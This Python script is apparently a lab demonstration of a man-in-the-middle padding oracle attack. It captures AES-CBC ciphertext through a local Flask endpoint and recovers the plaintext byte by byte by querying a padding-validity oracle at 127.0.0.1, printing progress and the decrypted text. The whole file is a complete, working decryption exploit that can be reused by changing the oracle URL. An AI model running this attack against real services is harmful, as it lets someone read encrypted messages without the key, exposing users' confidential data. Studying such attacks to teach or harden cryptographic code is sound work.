#!/usr/bin/env python3

import sys
import threading
import logging
import time
from flask import Flask, request, jsonify
import requests as http_req

# Force unbuffered stdout so progress shows immediately even when piped
sys.stdout.reconfigure(line_buffering=True)

# ──────────────────────────────────────────────
# HARDCODED / CONFIGURABLE VALUES
# ──────────────────────────────────────────────
BLOCK_SIZE    = 16     # AES block size = 128 bits, fixed by AES spec
PADDING       = "PKCS#7"
ORACLE_URL    = "http://127.0.0.1:5000/oracle"
LISTEN_PORT   = 5001   # port to receive captured ciphertext
# ──────────────────────────────────────────────

captured_event = threading.Event()
captured_ct = {"hex": None}

app = Flask(__name__)
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(force=True)
    ct_hex = data.get("ciphertext", "")
    if ct_hex:
        captured_ct["hex"] = ct_hex
        captured_event.set()
    return jsonify({"status": "ok"})


def start_flask():
    app.run(host="127.0.0.1", port=LISTEN_PORT, threaded=True)


# ──────────────────────────────────────────────
# PADDING ORACLE ATTACK LOGIC
# ──────────────────────────────────────────────

def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def split_blocks(data: bytes) -> list[bytes]:
    return [data[i : i + BLOCK_SIZE] for i in range(0, len(data), BLOCK_SIZE)]


def oracle(two_blocks: bytes) -> bool:
    """Ask the server: is the padding valid? (only gets True/False)"""
    for attempt in range(3):
        try:
            resp = http_req.post(
                ORACLE_URL, json={"ciphertext": two_blocks.hex()}, timeout=10
            )
            return resp.json().get("valid", False)
        except Exception:
            time.sleep(0.05)
    return False


def make_progress_bar(done: int, total: int, width: int = 30) -> str:
    pct = done / total if total else 0
    filled = int(width * pct)
    bar = "#" * filled + "-" * (width - filled)
    return f"[{bar}] {done}/{total} ({pct*100:.0f}%)"


def p(msg=""):
    """Print with immediate flush."""
    print(msg, flush=True)


def attack(ct_hex: str):
    data = bytes.fromhex(ct_hex)
    blocks = split_blocks(data)
    num_ct_blocks = len(blocks) - 1
    total_bytes = num_ct_blocks * BLOCK_SIZE
    queries = 0
    start_time = time.time()

    p()
    p("-" * 55)
    p("  PADDING ORACLE ATTACK STARTED")
    p("-" * 55)
    p(f"  Ciphertext : {ct_hex[:48]}...")
    p(f"  Total      : {len(data)} bytes = 1 IV + {num_ct_blocks} CT blocks")
    p(f"  To recover : {total_bytes} bytes")
    p(f"  Padding    : {PADDING}")
    p(f"  Oracle     : {ORACLE_URL}")
    p("-" * 55)
    p()

    # We'll build plaintext per-block, keeping proper left-to-right order
    block_plaintexts = []  # list of bytearray, one per CT block
    total_recovered = 0

    for blk_idx in range(1, len(blocks)):
        prev = blocks[blk_idx - 1]
        target = blocks[blk_idx]
        intermediate = bytearray(BLOCK_SIZE)
        this_block_bytes = bytearray(BLOCK_SIZE)

        for byte_pos in range(BLOCK_SIZE - 1, -1, -1):
            pad_val = BLOCK_SIZE - byte_pos
            crafted = bytearray(BLOCK_SIZE)

            for k in range(byte_pos + 1, BLOCK_SIZE):
                crafted[k] = intermediate[k] ^ pad_val

            found = False
            for guess in range(256):
                crafted[byte_pos] = guess
                forged = bytes(crafted) + target
                queries += 1

                if oracle(forged):
                    if byte_pos == BLOCK_SIZE - 1:
                        check = bytearray(crafted)
                        check[byte_pos - 1] ^= 0x01
                        queries += 1
                        if not oracle(bytes(check) + target):
                            continue

                    intermediate[byte_pos] = guess ^ pad_val
                    pt_byte = prev[byte_pos] ^ intermediate[byte_pos]
                    this_block_bytes[byte_pos] = pt_byte
                    total_recovered += 1

                    # Build the readable text so far (left-to-right, proper order)
                    text_so_far = ""
                    for prev_blk in block_plaintexts:
                        for b in prev_blk:
                            text_so_far += chr(b) if 32 <= b < 127 else "."
                    for i in range(BLOCK_SIZE):
                        if i < byte_pos:
                            text_so_far += "?"
                        else:
                            b = this_block_bytes[i]
                            text_so_far += chr(b) if 32 <= b < 127 else "."

                    bar = make_progress_bar(total_recovered, total_bytes)
                    sys.stdout.write(
                        f"\r  {bar}  q={queries:<5d} "
                        f'blk {blk_idx}/{num_ct_blocks}  '
                        f'"{text_so_far}"  '
                    )
                    sys.stdout.flush()

                    found = True
                    break

            if not found:
                p(f"\n\n  [FAIL] Could not recover byte at block {blk_idx}, pos {byte_pos}")
                return

        pt_block = xor_bytes(prev, bytes(intermediate))
        block_plaintexts.append(pt_block)

    elapsed = time.time() - start_time

    all_plain = b"".join(block_plaintexts)

    p()
    p()

    # Strip PKCS#7 padding and show it
    raw = all_plain
    pad_byte = raw[-1]
    if 1 <= pad_byte <= BLOCK_SIZE and raw[-pad_byte:] == bytes([pad_byte] * pad_byte):
        plaintext = raw[:-pad_byte]
        p(f"  PKCS#7 padding detected: last {pad_byte} bytes = 0x{pad_byte:02x}")
        p(f"  Stripped {pad_byte} padding bytes")
    else:
        plaintext = raw
        p("  [WARN] No valid PKCS#7 padding detected, returning raw bytes")

    try:
        text = plaintext.decode()
    except UnicodeDecodeError:
        text = plaintext.hex()

    p()
    p("=" * 55)
    p("  ATTACK COMPLETE")
    p("=" * 55)
    p(f"  Decrypted text  : {text}")
    p(f"  Plaintext (hex) : {plaintext.hex()}")
    p(f"  Bytes recovered : {total_recovered}")
    p(f"  Oracle queries  : {queries}")
    p(f"  Time taken      : {elapsed:.2f}s")
    p("=" * 55)
    p()


def print_config():
    p("=" * 55)
    p("  MITM ATTACKER  (Padding Oracle Attack)")
    p("=" * 55)
    p()
    p("  Hardcoded values:")
    p(f"    Block size   : {BLOCK_SIZE} bytes ({BLOCK_SIZE * 8} bits)")
    p(f"    Padding      : {PADDING}")
    p(f"    Oracle URL   : {ORACLE_URL}")
    p(f"    Listen port  : {LISTEN_PORT}")
    p()
    p("  The attacker does NOT know the key.")
    p("  It only asks the oracle: 'is padding valid?' (yes/no)")
    p("-" * 55)
    p()


def main():
    print_config()

    flask_thread = threading.Thread(target=start_flask, daemon=True)
    flask_thread.start()
    p(f"  [OK] Listening for ciphertext on port {LISTEN_PORT}")
    p("  Waiting for sender to send a message...\n")

    while True:
        captured_event.wait()
        captured_event.clear()

        ct_hex = captured_ct["hex"]
        p(f"  [CAPTURED] Ciphertext received!")
        p(f"  {ct_hex}")

        attack(ct_hex)

        p("  Waiting for next message...\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        p("\n  Bye.")
